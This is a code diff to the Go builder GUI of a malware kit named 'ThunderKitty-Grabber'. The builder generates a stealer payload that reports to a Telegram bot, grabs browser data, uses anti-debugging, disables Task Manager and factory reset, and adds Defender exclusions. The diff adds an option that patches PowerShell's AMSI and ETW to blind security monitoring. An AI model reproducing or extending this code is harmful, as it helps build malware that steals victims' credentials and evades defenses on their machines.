@@ -13,7 +13,7 @@ import (
 	"fyne.io/fyne/v2/widget"
 )
 
-func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL, speakTTSMessage string, swapMouse bool) {
+func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL, speakTTSMessage string, swapMouse, patchPowerShell bool) {
 	content := fmt.Sprintf(`
 package main
 
@@ -26,6 +26,7 @@ import (
 	"ThunderKitty-Grabber/utils/taskmanager"
 	"ThunderKitty-Grabber/utils/exclude"
 	"ThunderKitty-Grabber/utils/defender"
+	"ThunderKitty-Grabber/utils/powershellpatcher"
 	"fmt"
 	"os/exec"
 )
@@ -91,9 +92,14 @@ func main() {
 	} else {
 		fmt.Println("Swap mouse not enabled")
 	}
- 
+
+	if %t {
+		PowerShellPatcher.Patch()
+	} else {
+		fmt.Println("PowerShell patcher not enabled")
+	}
 }
-`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager, openSiteURL, speakTTSMessage, swapMouse)
+`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager, openSiteURL, speakTTSMessage, swapMouse, patchPowerShell)
 
 	file, err := os.Create("main.go")
 	if err != nil {
@@ -142,6 +148,7 @@ func main() {
 	hideConsole := widget.NewCheck("Hide Console Window", nil)
 	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
 	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)
+	patchPowershell := widget.NewCheck("Patch PowerShell (AMSI & ETW)", nil)
 
 	// Trollware Widgets
 	openSiteEntry := widget.NewEntry()
@@ -157,7 +164,7 @@ func main() {
 		telechatid := telegramChatIdEntry.Text
 		openSiteURL := openSiteEntry.Text
 		speakTTSMessage := speakTTSEntry.Text
-		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL, speakTTSMessage, enableSwapMouse.Checked)
+		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL, speakTTSMessage, enableSwapMouse.Checked, patchPowershell.Checked)
 	})
 
 	grabberSettings := container.NewVBox(
@@ -170,10 +177,10 @@ func main() {
 		hideConsole,
 		disableFactoryReset,
 		disableTaskManager,
+		patchPowershell,
 		buildButton,
 	)
 
-	// Trollware Configuration
 	trollwareSettings := container.NewVBox(
 		widget.NewLabel("Trollware Configuration"),
 		openSiteEntry,
